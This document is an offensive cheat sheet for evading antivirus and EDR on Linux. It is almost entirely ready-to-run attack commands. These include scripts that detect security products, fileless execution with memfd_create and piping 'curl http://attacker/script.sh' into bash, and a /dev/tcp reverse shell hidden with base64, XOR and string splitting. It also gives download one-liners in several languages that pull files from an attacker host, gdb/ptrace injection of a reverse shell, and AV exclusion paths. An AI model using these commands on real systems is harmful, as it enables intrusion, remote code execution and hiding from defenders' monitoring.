# AV/EDR Evasion on Linux

Identify and bypass security controls on Linux systems.

---

## 1. Identify Running Security

```bash
# Common EDR/AV processes
ps aux | grep -iE "falcon|crowdstrike|sentinel|carbon|sophos|clamav|ossec|wazuh|snort|suricata|auditd|sysmon|velociraptor"

# Check loaded kernel modules
lsmod | grep -iE "falcon|sentinel|carbon|sophos"

# Check systemd services
systemctl list-units --type=service | grep -iE "falcon|sentinel|carbon|sophos|clam|ossec|wazuh"

# CrowdStrike Falcon
ls /opt/CrowdStrike/ 2>/dev/null
ps aux | grep falcon

# SentinelOne
ls /opt/sentinelone/ 2>/dev/null
ps aux | grep sentinel

# ClamAV
freshclam --version 2>/dev/null
ps aux | grep clam
```

---

## 2. Fileless Execution

```bash
# memfd_create — execute from memory (no file on disk)
python3 -c "
import ctypes, os, base64
libc = ctypes.CDLL('libc.so.6')
fd = libc.memfd_create(b'', 0)
payload = open('/path/to/binary', 'rb').read()
os.write(fd, payload)
os.execve(f'/proc/self/fd/{fd}', ['name'], os.environ)
"

# /dev/shm execution (RAM filesystem, not scanned by many AVs)
cp payload /dev/shm/.hidden
chmod +x /dev/shm/.hidden
/dev/shm/.hidden

# Process substitution
bash <(curl -s http://attacker/script.sh)

# stdin execution
curl -s http://attacker/script.sh | bash

# Python in-memory
python3 -c "exec(__import__('urllib.request',fromlist=['urlopen']).urlopen('http://attacker/payload.py').read())"
```

---

## 3. Obfuscation

### Base64
```bash
# Encode
echo 'bash -i >& /dev/tcp/attacker/4444 0>&1' | base64
# YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci80NDQ0IDA+JjE=

# Execute
echo YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci80NDQ0IDA+JjE= | base64 -d | bash
```

### XOR
```python
#!/usr/bin/env python3
import sys
key = 0x41
with open(sys.argv[1], 'rb') as f:
    data = f.read()
encoded = bytes([b ^ key for b in data])
with open(sys.argv[1] + '.enc', 'wb') as f:
    f.write(encoded)
```

### String concatenation
```bash
# Avoid string signatures
a='ba'; b='sh'; c=' -i'; d=' >& /dev/tc'; e='p/attack'; f='er/4444 0>&1'
$a$b$c$d$e$f
```

---

## 4. Living Off the Land

```bash
# Download without curl/wget
# Python
python3 -c "import urllib.request; urllib.request.urlretrieve('http://attacker/file', '/tmp/file')"

# Perl
perl -e 'use LWP::Simple; getstore("http://attacker/file", "/tmp/file")'

# Ruby
ruby -e 'require "net/http"; File.write("/tmp/file", Net::HTTP.get(URI("http://attacker/file")))'

# PHP
php -r 'file_put_contents("/tmp/file", file_get_contents("http://attacker/file"));'

# openssl
openssl s_client -connect attacker:443 -quiet < /dev/null > /tmp/file

# Bash /dev/tcp
exec 3<>/dev/tcp/attacker/80; echo -e "GET /file HTTP/1.0\r\nHost: attacker\r\n\r\n" >&3; cat <&3 > /tmp/file
```

---

## 5. Process Injection (ptrace)

```bash
# Inject shellcode into running process via ptrace
# Requires: same UID or CAP_SYS_PTRACE

# Check ptrace scope
cat /proc/sys/kernel/yama/ptrace_scope
# 0 = any process, 1 = parent only, 2 = admin only, 3 = disabled

# GDB injection
gdb -p <PID> -batch -ex 'call (void)system("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"")'
```

---

## 6. Common AV Exclusion Paths

```
/tmp/
/dev/shm/
/var/tmp/
/run/
/proc/
/sys/
```

---

## 7. ClamAV-Specific Bypass

```bash
# Check ClamAV scan exclusions
cat /etc/clamav/clamd.conf 2>/dev/null | grep -i "exclude"

# ClamAV often only scans on-access or on-demand, not real-time
# Check if clamonacc is running
ps aux | grep clamonacc
```
